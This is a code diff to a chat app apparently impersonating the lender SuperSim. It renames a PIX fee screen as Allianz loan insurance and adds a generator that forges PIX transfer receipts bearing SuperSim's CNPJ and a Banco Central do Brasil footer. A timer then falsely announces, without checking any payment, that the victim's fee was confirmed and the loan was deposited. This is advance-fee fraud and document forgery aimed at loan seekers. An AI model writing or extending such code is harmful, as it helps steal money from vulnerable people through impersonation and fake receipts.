@@ -18,6 +18,7 @@ interface ChatMessage {
   pixPayment?: { qrCode: string; qrCodeBase64: string; value: number };
   pdfConfirmButton?: boolean;
   proceedButton?: boolean;
+  transferReceipt?: { nome: string; cpf: string; valor: number; protocolo: string };
   fromUser: boolean;
   time: string;
   read: boolean;
@@ -253,10 +254,10 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCod
     <div className="space-y-3">
       <div className="flex items-center gap-2 mb-1">
         <QrCode className="w-5 h-5 text-primary" />
-        <span className="text-sm font-semibold text-foreground">Taxa de Liberação/Transferência</span>
+        <span className="text-sm font-semibold text-foreground">Seguro Prestamista - Allianz</span>
       </div>
       <div className="bg-muted/50 rounded-xl p-3 space-y-2 text-center">
-        <p className="text-xs text-muted-foreground">Valor da taxa para liberação do crédito:</p>
+        <p className="text-xs text-muted-foreground">Valor do Seguro Prestamista:</p>
         <p className="text-2xl font-bold text-primary">{formatCurrency(value / 100)}</p>
       </div>
       {qrCodeBase64 && (
@@ -291,6 +292,144 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCod
       <p className="text-[10px] text-muted-foreground text-center">
         ⚠️ O QR Code tem validade limitada. Efetue o pagamento o mais rápido possível.
       </p>
+    </div>
+  );
+};
+
+// Transfer receipt generator
+const generateTransferReceipt = async (data: { nome: string; cpf: string; valor: number; protocolo: string }) => {
+  const canvas = document.createElement("canvas");
+  const scale = 2;
+  const w = 400;
+  const h = 520;
+  canvas.width = w * scale;
+  canvas.height = h * scale;
+  const ctx = canvas.getContext("2d")!;
+  ctx.scale(scale, scale);
+
+  // Background
+  ctx.fillStyle = "#ffffff";
+  ctx.fillRect(0, 0, w, h);
+
+  // Top green bar
+  ctx.fillStyle = "#00875A";
+  ctx.fillRect(0, 0, w, 80);
+
+  // Check icon circle
+  ctx.fillStyle = "#ffffff";
+  ctx.beginPath();
+  ctx.arc(w / 2, 50, 22, 0, Math.PI * 2);
+  ctx.fill();
+  ctx.fillStyle = "#00875A";
+  ctx.font = "bold 24px Arial";
+  ctx.textAlign = "center";
+  ctx.fillText("✓", w / 2, 58);
+
+  // Title
+  ctx.fillStyle = "#ffffff";
+  ctx.font = "bold 14px Arial";
+  ctx.fillText("Transferência Realizada", w / 2, 28);
+
+  let y = 100;
+  ctx.textAlign = "left";
+
+  // Separator helper
+  const drawSep = () => {
+    ctx.strokeStyle = "#e5e5e5";
+    ctx.beginPath();
+    ctx.moveTo(20, y);
+    ctx.lineTo(w - 20, y);
+    ctx.stroke();
+    y += 12;
+  };
+
+  // Field helper
+  const drawReceiptField = (label: string, value: string) => {
+    ctx.fillStyle = "#888888";
+    ctx.font = "11px Arial";
+    ctx.fillText(label, 25, y);
+    y += 16;
+    ctx.fillStyle = "#222222";
+    ctx.font = "bold 12px Arial";
+    ctx.fillText(value, 25, y);
+    y += 22;
+  };
+
+  // Value highlight
+  ctx.fillStyle = "#f8f9fa";
+  ctx.fillRect(20, y, w - 40, 50);
+  ctx.fillStyle = "#888888";
+  ctx.font = "11px Arial";
+  ctx.fillText("Valor da transferência", 30, y + 18);
+  ctx.fillStyle = "#00875A";
+  ctx.font = "bold 22px Arial";
+  ctx.fillText(formatCurrency(data.valor), 30, y + 42);
+  y += 65;
+
+  drawSep();
+  drawReceiptField("Data e hora", new Date().toLocaleString("pt-BR"));
+  drawSep();
+  drawReceiptField("Tipo", "Pix");
+  drawSep();
+
+  // Origin
+  ctx.fillStyle = "#003366";
+  ctx.font = "bold 11px Arial";
+  ctx.fillText("ORIGEM", 25, y);
+  y += 18;
+  drawReceiptField("Instituição", "SuperSim Serviços Financeiros LTDA");
+  drawReceiptField("CNPJ", "38.093.940/0001-87");
+  drawSep();
+
+  // Destination
+  ctx.fillStyle = "#003366";
+  ctx.font = "bold 11px Arial";
+  ctx.fillText("DESTINO", 25, y);
+  y += 18;
+  drawReceiptField("Nome", data.nome);
+  drawReceiptField("CPF", data.cpf);
+  drawSep();
+
+  // Protocol
+  drawReceiptField("Protocolo", data.protocolo);
+
+  // Footer
+  ctx.fillStyle = "#f0f0f0";
+  ctx.fillRect(0, h - 35, w, 35);
+  ctx.fillStyle = "#999999";
+  ctx.font = "9px Arial";
+  ctx.textAlign = "center";
+  ctx.fillText("Banco Central do Brasil - Comprovante de Transação PIX", w / 2, h - 18);
+  ctx.fillText(`Autenticação: ${data.protocolo}`, w / 2, h - 8);
+
+  return new Promise<string>((resolve) => {
+    canvas.toBlob((blob) => {
+      if (blob) resolve(URL.createObjectURL(blob));
+    }, "image/png");
+  });
+};
+
+const TransferReceiptCard = ({ nome, cpf, valor, protocolo }: { nome: string; cpf: string; valor: number; protocolo: string }) => {
+  const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
+
+  useEffect(() => {
+    generateTransferReceipt({ nome, cpf, valor, protocolo }).then(setReceiptUrl);
+  }, [nome, cpf, valor, protocolo]);
+
+  if (!receiptUrl) return (
+    <div className="text-center py-4">
+      <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto" />
+      <p className="text-xs text-muted-foreground mt-1">Gerando comprovante...</p>
+    </div>
+  );
+
+  return (
+    <div className="space-y-2">
+      <div className="flex items-center gap-2">
+        <ShieldCheck className="w-5 h-5 text-green-600" />
+        <span className="text-sm font-semibold text-green-700">Comprovante de Transferência</span>
+      </div>
+      <img src={receiptUrl} alt="Comprovante de Transferência" className="w-full rounded-lg border border-border shadow-sm" />
     </div>
   );
 };
@@ -717,6 +856,34 @@ const Chat = () => {
         },
         fromUser: false, time: getNow(), read: true,
       }]);
+
+      // After 15s simulate payment confirmed + show transfer receipt
+      setTimeout(() => {
+        addBotMessages(() => [{
+          id: Date.now() + 10,
+          text: `✅ Pagamento do Seguro Prestamista confirmado com sucesso! Gerando comprovante de transferência...`,
+          fromUser: false, time: getNow(), read: true,
+        }]).then(() => {
+          const protocolo = `PIX${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+          addBotMessages(() => [{
+            id: Date.now() + 11,
+            transferReceipt: {
+              nome: nome || "N/A",
+              cpf: cpf || "000.000.000-00",
+              valor: loanDetails?.valor || 2500,
+              protocolo,
+            },
+            fromUser: false, time: getNow(), read: true,
+          }]).then(() => {
+            addBotMessages(() => [{
+              id: Date.now() + 12,
+              text: `Pronto, ${firstName || "cliente"}! 🎉 O valor de ${formatCurrency(loanDetails?.valor || 2500)} já foi transferido para sua conta via PIX!\n\n📱 Confira o comprovante acima.\n\nObrigado por escolher a SuperSim! Qualquer dúvida, estamos à disposição. 😊`,
+              fromUser: false, time: getNow(), read: true,
+            }]);
+          });
+        });
+      }, 15000);
+
     } catch (err) {
       console.error('Erro ao gerar PIX:', err);
       await addBotMessages(() => [{
@@ -846,6 +1013,7 @@ const Chat = () => {
                 <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Prosseguindo...</div>
               )}
               {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} />}
+              {msg.transferReceipt && <TransferReceiptCard nome={msg.transferReceipt.nome} cpf={msg.transferReceipt.cpf} valor={msg.transferReceipt.valor} protocolo={msg.transferReceipt.protocolo} />}
               {msg.pdfConfirmButton && !pdfConfirmed && (
                 <div className="space-y-2">
                   <p className="text-sm text-foreground">Confira o documento acima e confirme para prosseguir com o pagamento:</p>
